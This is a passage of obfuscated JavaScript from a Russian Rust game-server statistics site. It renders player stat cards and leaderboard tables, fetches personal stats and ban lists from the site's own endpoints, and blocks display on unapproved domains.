')</span></h1>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-container-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section-gather\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x16f)]?.[_0x314e71(0x191)] || 0x0) + _0x314e71(0x294) + (_0x3b2bf9[_0x314e71(0x16f)]?.[_0x314e71(0x1c5)] || 0x0) + _0x314e71(0x210) + (_0x3b2bf9[_0x314e71(0x16f)]?.[_0x314e71(0x114)] || 0x0) + _0x314e71(0x205) + (_0x3b2bf9['ExplosiveUsageStats']?.['ammo.rocket.basic'] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Обычная</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/Rocket_icon.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x16f)]?.[_0x314e71(0x133)] || 0x0) + _0x314e71(0x1f7) + (_0x3b2bf9[_0x314e71(0x16f)]?.[_0x314e71(0x18f)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Бобовка</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/grenade.beancan.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x16f)]?.[_0x314e71(0x1b7)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Сачеля</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/explosive.satchel.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x16f)]?.[_0x314e71(0x173)] || 0x0) + _0x314e71(0x1be);
    return _0x1a29e7;
}
var currentUrl = window['location'][_0x31dfac(0x1a6)];
const searchIntervalstats = setInterval(findAndAttachEventStats, 0x1f4)
  , searchIntervaltop = setInterval(findAndAttachEventTop, 0x1f4)
  , searchInterval = setInterval(findAndAttachEvent, 0x1f4);
window[_0x31dfac(0x2ac)](_0x31dfac(0x27e), () => {
    setTimeout( () => {
        UpdateDiscord(),
        findAndAttachEventStats(),
        findAndAttachEventTop(),
        findAndAttachEvent();
    }
    , 0x12c);
}
);
var currentUrl = window[_0x31dfac(0x21a)][_0x31dfac(0x1a6)];
setInterval(function() {
    const _0x4dc200 = _0x31dfac;
    window[_0x4dc200(0x21a)]['href'] !== currentUrl && (findAndAttachEvent(),
    findAndAttachEventStats(),
    UpdateDiscord(),
    currentUrl = window[_0x4dc200(0x21a)][_0x4dc200(0x1a6)]);
}, 0x12c);
function check() {
    const _0x508d0c = _0x31dfac;
    var _0x908e07 = 'vanilla-rust.gamestores.app'
      , _0x2c6e31 = _0x508d0c(0x2a5)
      , _0x156bf5 = _0x508d0c(0x254)
      , _0x23e011 = _0x508d0c(0x155)
      , _0xb24249 = _0x508d0c(0x1bb)
      , _0x32135e = window[_0x508d0c(0x21a)][_0x508d0c(0x251)];
    if (_0x32135e !== _0x908e07 && _0x32135e !== _0x2c6e31 && _0x32135e !== _0x156bf5 && _0x32135e !== _0x23e011 && _0x32135e !== _0xb24249) {
        var _0xd75cc7 = document['createElement'](_0x508d0c(0x1ef));
        _0xd75cc7[_0x508d0c(0x1a1)][_0x508d0c(0x242)] = _0x508d0c(0x131),
        _0xd75cc7['style'][_0x508d0c(0xf8)] = '0',
        _0xd75cc7[_0x508d0c(0x1a1)]['left'] = '0',
        _0xd75cc7['style']['width'] = _0x508d0c(0x166),
        _0xd75cc7[_0x508d0c(0x1a1)]['height'] = _0x508d0c(0x166),
        _0xd75cc7[_0x508d0c(0x1a1)][_0x508d0c(0xf7)] = _0x508d0c(0x26b),
        _0xd75cc7[_0x508d0c(0x1a1)][_0x508d0c(0x1b1)] = _0x508d0c(0x1dd),
        _0xd75cc7[_0x508d0c(0x1a1)][_0x508d0c(0x13f)] = 'center',
        _0xd75cc7[_0x508d0c(0x1a1)]['alignItems'] = 'center',
        _0xd75cc7[_0x508d0c(0x1a1)]['zIndex'] = _0x508d0c(0x297),
        _0xd75cc7[_0x508d0c(0x1aa)] = _0x508d0c(0x118),
        document[_0x508d0c(0x21b)][_0x508d0c(0x219)](_0xd75cc7);
    }
}
;let isTopDataDisplayed = ![], topTable, isLoadingTop = ![];
async function fetchTop(_0x4c52f1, _0x4fbcd9) {
    const _0x1942c5 = _0x31dfac;
    try {
        isLoadingTop = !![];
        const _0x3fce8d = document[_0x1942c5(0x2dc)]('loading-indicator');
        _0x3fce8d[_0x1942c5(0x1a1)][_0x1942c5(0x1b1)] = 'block';
        const _0x254688 = await fetch(_0x1942c5(0x12e) + _0x4c52f1 + '&timeframe=' + _0x4fbcd9);
        if (!_0x254688['ok'])
            return console[_0x1942c5(0x18c)](_0x1942c5(0x231), _0x254688[_0x1942c5(0x109)], _0x254688[_0x1942c5(0x13d)]),
            null;
        const _0x585f41 = await _0x254688['json']();
        return _0x585f41;
    } catch (_0x14d756) {
        return console[_0x1942c5(0x18c)](_0x1942c5(0x130), _0x14d756),
        null;
    } finally {
        isLoadingTop = ![];
    }
}
async function displayDataTop(_0x5a27b8, _0x10867e) {
    const _0x5e9876 = _0x31dfac;
    if (isTopDataDisplayed)
        return;
    isTopDataDisplayed = !![];
    const _0xfe7de3 = document[_0x5e9876(0x2dc)](_0x5e9876(0x18e))
      , _0x1bb2e9 = document['getElementById'](_0x5e9876(0x256))
      , _0x2739fd = document[_0x5e9876(0x2dc)](_0x5e9876(0x111))
      , _0x2a9553 = document[_0x5e9876(0x2dc)](_0x5e9876(0x218))
      , _0x37629b = document[_0x5e9876(0x1d5)](_0x5e9876(0x187));
    try {
        const _0x10b90c = await fetchTop(_0x5a27b8, _0x10867e);
        console[_0x5e9876(0x23e)](_0x5e9876(0x1ab), _0x10b90c);
        const _0x4406c6 = document[_0x5e9876(0x1d5)](_0x5e9876(0x1c7));
        _0x4406c6 && _0x4406c6[_0x5e9876(0x244)]();
        topTable && topTable[_0x5e9876(0x17a)]()['destroy']();
        if (!_0x10b90c || Object[_0x5e9876(0x184)](_0x10b90c)[_0x5e9876(0x26d)] === 0x0) {
            _0xfe7de3[_0x5e9876(0x1aa)] = 'Нет\x20данных\x20для\x20отображения',
            console[_0x5e9876(0x23e)](_0x5e9876(0x216));
            return;
        }
        const _0x185afd = document[_0x5e9876(0x1d5)](_0x5e9876(0x1f6))
          , _0x5d6a04 = document[_0x5e9876(0x1a9)](_0x5e9876(0x2a2));
        _0x5d6a04['textContent'] = 'Сохранить\x20как\x20картинку',
        _0x5d6a04['className'] = 'custom-save-image-btn',
        _0x5d6a04['addEventListener'](_0x5e9876(0x201), async () => {
            const _0x494c00 = _0x5e9876;
            try {
                const _0x1fe1a9 = document[_0x494c00(0x1d5)]('.btn-wipe');
                _0x1fe1a9 && (_0x1fe1a9[_0x494c00(0x1a1)][_0x494c00(0x1b1)] = 'none');
                const _0xa60854 = await _0x5ddbcd(_0x1bb2e9);
                _0x1ecf6a(_0xa60854),
                _0x5d6a04[_0x494c00(0x1a1)][_0x494c00(0x1b1)] = _0x494c00(0x18d),
                setTimeout( () => {
                    const _0x4155fa = _0x494c00;
                    _0x1fe1a9 && (_0x1fe1a9[_0x4155fa(0x1a1)]['display'] = 'flex');
                }
                , 0x1f4);
            } catch (_0x407dfc) {
                console[_0x494c00(0x18c)]('Ошибка\x20при\x20сохранении\x20таблицы\x20как\x20изображения:', _0x407dfc);
            }
        }
        ),
        _0x185afd[_0x5e9876(0x2d3)][_0x5e9876(0x278)](_0x5d6a04, _0x185afd[_0x5e9876(0x2ce)]),
        $['fn']['dataTable'][_0x5e9876(0x229)][_0x5e9876(0x10d)][_0x5e9876(0x29b)]['natural-pre'] = function(_0x33b09c) {
            const _0x546852 = _0x5e9876;
            return _0x33b09c[_0x546852(0x167)](/(\d{1,})([dhm])/g, function(_0x3a6ce0, _0xe7ecb8, _0x3381d8) {
                const _0x35965f = _0x546852
                  , _0x561f93 = {
                    'd': 0x18 * 0x3c,
                    'h': 0x3c,
                    'm': 0x1
                }[_0x3381d8];
                return (parseInt(_0xe7ecb8) * _0x561f93)[_0x35965f(0x13e)]()[_0x35965f(0x24c)](0xa, '0') + _0x3381d8;
            });
        }
        ;
        const _0x2fdc0c = Object[_0x5e9876(0x184)](_0x10b90c)[_0x5e9876(0x27c)](_0x793826 => {
            const _0x15fabf = _0x5e9876;
            return {
                'category': _0x10b90c[_0x793826][0x0][_0x15fabf(0x24e)],
                'players': _0x10b90c[_0x793826]
            };
        }
        );
        console[_0x5e9876(0x23e)](_0x5e9876(0x1e0), _0x2fdc0c),
        topTable = $(_0x5e9876(0x200))[_0x5e9876(0x11b)]({
            'language': {
                'url': _0x5e9876(0x252)
            },
            'dom': _0x5e9876(0x274),
            'buttons': ['copy', _0x5e9876(0x19a), _0x5e9876(0x157)],
            'searching': ![],
            'paging': ![],
            'info': ![],
            'data': _0x2fdc0c,
            'columns': [{
                'data': _0x5e9876(0x1cc),
                'title': _0x5e9876(0x2a9)
            }, {
                'data': _0x5e9876(0x169),
                'render': function(_0x23c2f9, _0x33ddb9, _0x59120c) {
                    const _0x334734 = _0x5e9876;
                    return _0x334734(0x241) + _0x23c2f9[_0x334734(0x27c)](_0x4fca79 => {
                        const _0x27d84f = _0x334734
                          , _0x179682 = _0x4fca79[_0x27d84f(0x1eb)] === 0x1 ? 'place-1' : _0x4fca79[_0x27d84f(0x1eb)] === 0x2 ? _0x27d84f(0x204) : _0x27d84f(0x145)
                          , _0x14c76d = _0x10867e === _0x27d84f(0x139) ? '' : '<div\x20class=\x22player-reward\x20' + _0x179682 + _0x27d84f(0x14d);
                        return '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-block\x20' + _0x179682 + _0x27d84f(0x23c) + _0x4fca79[_0x27d84f(0x2bd)] + _0x27d84f(0x1bc) + _0x5a27b8 + '\x22\x20data-timeframe=\x22' + _0x10867e + _0x27d84f(0x290) + _0x4fca79['Place'] + _0x27d84f(0x21c) + _0x14c76d + _0x27d84f(0x2c4) + _0x4fca79[_0x27d84f(0x2bd)] + _0x27d84f(0x26f) + _0x4fca79[_0x27d84f(0x2bd)] + _0x27d84f(0x2bf) + _0x4fca79[_0x27d84f(0x240)] + _0x27d84f(0x1d2) + _0x4fca79[_0x27d84f(0x172)] + '\x20очков</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-status\x20' + _0x4fca79[_0x27d84f(0x20f)] + '\x22>' + (_0x4fca79[_0x27d84f(0x20f)] === _0x27d84f(0x170) ? '🟢' : '🔴') + '\x20' + _0x4fca79[_0x27d84f(0x20f)] + _0x27d84f(0x29a);
                    }
                    )[_0x334734(0x1b4)]('') + _0x334734(0x266);
                }
            }],
            'order': [[0x0, _0x5e9876(0x215)]]
        }),
        _0x2739fd[_0x5e9876(0x1a1)][_0x5e9876(0x1b1)] = _0x5e9876(0x1fb),
        $(_0x5e9876(0x189))['on'](_0x5e9876(0x201), '.player-block', async function() {
            const _0x394b2c = _0x5e9876
              , _0x972c42 = $(this)[_0x394b2c(0x299)](_0x394b2c(0x20b))
              , _0x1f4c59 = $(this)[_0x394b2c(0x299)]('table')
              , _0x708619 = $(this)[_0x394b2c(0x299)]('timeframe');
            if (modalOpen)
                return;
            try {
                modalOpen = !![],
                document[_0x394b2c(0x21b)][_0x394b2c(0x174)][_0x394b2c(0xf5)]('body-no-scroll');
                const _0x4a3c8a = 'https://rustaria.ru/personalstats.php?steamid=' + _0x972c42 + _0x394b2c(0x2d5) + _0x1f4c59 + '&timeframe=' + _0x708619
                  , _0x31ede5 = await fetch(_0x4a3c8a);
                if (!_0x31ede5['ok']) {
                    console[_0x394b2c(0x18c)]('Ошибка\x20при\x20запросе\x20данных:', _0x31ede5['status'], _0x31ede5['statusText']),
                    document[_0x394b2c(0x21b)][_0x394b2c(0x174)][_0x394b2c(0x244)](_0x394b2c(0xf9)),
                    modalOpen = ![];
                    return;
                }
                const _0x2b2be4 = await _0x31ede5[_0x394b2c(0x129)]();
                createModal(_0x2b2be4);
            } catch (_0x3f62f6) {
                console[_0x394b2c(0x18c)](_0x394b2c(0x130), _0x3f62f6),
                document[_0x394b2c(0x21b)]['classList'][_0x394b2c(0x244)](_0x394b2c(0xf9)),
                modalOpen = ![];
            }
        });
        async function _0x5ddbcd(_0x348411) {
            const _0x473319 = _0x5e9876
              , _0x50ee7e = await html2canvas(_0x348411);
            return _0x50ee7e[_0x473319(0x2ab)]();
        }
        function _0x1ecf6a(_0x5c5a0b) {
            const _0x40ad5d = _0x5e9876
              , _0x5e9dec = document[_0x40ad5d(0x1a9)]('a');
            _0x5e9dec[_0x40ad5d(0x1a6)] = _0x5c5a0b,
            _0x5e9dec['download'] = _0x40ad5d(0x140),
            document[_0x40ad5d(0x21b)]['appendChild'](_0x5e9dec),
            _0x5e9dec['click'](),
            document['body'][_0x40ad5d(0x1c4)](_0x5e9dec);
        }
    } catch (_0x533db9) {
        console[_0x5e9876(0x18c)](_0x5e9876(0x27a), _0x533db9);
    } finally {
        _0x2a9553[_0x5e9876(0x1a1)]['display'] = _0x5e9876(0x18d),
        _0xfe7de3[_0x5e9876(0x1a1)]['display'] = _0x5e9876(0x18d),
        isTopDataDisplayed = ![],
        _0x37629b && (_0x37629b[_0x5e9876(0x1a1)][_0x5e9876(0x102)] = _0x5e9876(0x18a));
    }
}
let isBtnTopClicked = ![];
function findAndAttachEventTop() {
    const _0x8d857d = _0x31dfac
      , _0x12f6fd = document[_0x8d857d(0x1fd)](_0x8d857d(0x190))
      , _0x557215 = document['querySelectorAll'](_0x8d857d(0x16a));
    _0x12f6fd[_0x8d857d(0x26d)] > 0x0 && (setTimeout(function() {
        const _0x196bea = _0x8d857d
          , _0x676203 = document[_0x196bea(0x2dc)](_0x196bea(0x269));
        _0x676203 && !isBtnTopClicked && (isBtnTopClicked = !![],
        _0x676203[_0x196bea(0x201)]());
    }, 0x12c),
    clearInterval(searchIntervaltop),
    _0x12f6fd[_0x8d857d(0x1bf)](_0x1c69a5 => {
        const _0x9edd05 = _0x8d857d;
        _0x1c69a5[_0x9edd05(0x2ac)](_0x9edd05(0x201), async () => {
            const _0x5bfa79 = _0x9edd05;
            _0x1c69a5['disabled'] = !![];
            try {
                _0x12f6fd[_0x5bfa79(0x1bf)](_0x41d0a4 => {
                    const _0x246358 = _0x5bfa79;
                    _0x41d0a4[_0x246358(0x174)][_0x246358(0x244)](_0x246358(0x268));
                }
                ),
                _0x1c69a5[_0x5bfa79(0x174)]['add'](_0x5bfa79(0x268));
                const _0x148ab6 = document[_0x5bfa79(0x2dc)](_0x5bfa79(0x111));
                _0x148ab6['style'][_0x5bfa79(0x1b1)] = 'none';
                const _0x67d9ec = Array[_0x5bfa79(0x2a4)](_0x557215)[_0x5bfa79(0x17c)](_0x418222 => _0x418222[_0x5bfa79(0x1ba)])[_0x5bfa79(0x1d6)];
                await displayDataTop(_0x1c69a5[_0x5bfa79(0xfa)][_0x5bfa79(0x1ed)], _0x67d9ec);
            } catch (_0x481bde) {
                console['error'](_0x5bfa79(0x27a), _0x481bde);
            } finally {
                _0x1c69a5[_0x5bfa79(0x1a4)] = ![],
                attachDetailsButtonClickEvent();
            }
        }
        );
    }
    ),
    _0x557215[_0x8d857d(0x1bf)](_0x538835 => {
        const _0x19f411 = _0x8d857d;
        _0x538835['addEventListener'](_0x19f411(0x29f), async () => {
            const _0x4011b8 = _0x19f411
              , _0x15f536 = document['getElementById'](_0x4011b8(0x111));
            _0x15f536['style'][_0x4011b8(0x1b1)] = _0x4011b8(0x18d);
            const _0x18f999 = document['querySelector'](_0x4011b8(0x29c));
            if (_0x18f999) {
                const _0x306afd = Array['from'](_0x557215)[_0x4011b8(0x17c)](_0x4ddee9 => _0x4ddee9['checked'])[_0x4011b8(0x1d6)];
                await displayDataTop(_0x18f999[_0x4011b8(0xfa)][_0x4011b8(0x1ed)], _0x306afd);
            }
        }
        );
    }
    ),
    attachDetailsButtonClickEvent());
}
function _0x20f0() {
    const _0x38a435 = ['ExplosiveUsageStats', 'Online', '33bXFjry', 'Score', 'explosive.timed', 'classList', 'https://rustaria.ru/api/banGG/banlist.php?servername=', 'Ошибка\x20воспроизведения\x20звука:', '#russian_banlist', 'Kills', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20rightfoot\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Правая\x20нога</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>', 'clear', 'Ошибка\x20при\x20воспроизведении\x20звука:', 'find', 'values', 'servers', 'green.berry', '.ProfileContent-module__inputWrapper', '.Toast-module__message', 'russian_stats', 'head', 'keys', 'personaname', 'modal', '.btn-wipe', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Грибов</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/mushroom.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '#topplayer-custom\x20tbody', 'translateY(48px)', '.btn.Button-module__btn.Button-module__gray', 'error', 'none', 'loading', 'grenade.beancan', '.topBtn', 'grenade.f1', 'mouseover', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22additional-text\x22>Последний\x20вход\x20<span\x20style=\x22color:\x20#0ea300;\x22>', 'readyState', 'onkeydown', 'StateDeadAnimal', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-helicopter\x20profile-icon\x22></i>Вертолетов</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'onerror', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Роз</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://rustexplore.com/images/130/rose.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'excel', 'bears', 'HeadHits', 'modalContent', 'CropGrowthStats', 'Elements\x20not\x20found', '.Toasts-module__wrapper', 'style', 'clipboard', 'wipeBlockButton', 'disabled', 'vanilla_stats', 'href', 'includes', 'play', 'createElement', 'innerHTML', 'Полученные\x20данные:', 'russian2_stats', 'red.berry', '10xKjKOT', 'PlayTime', 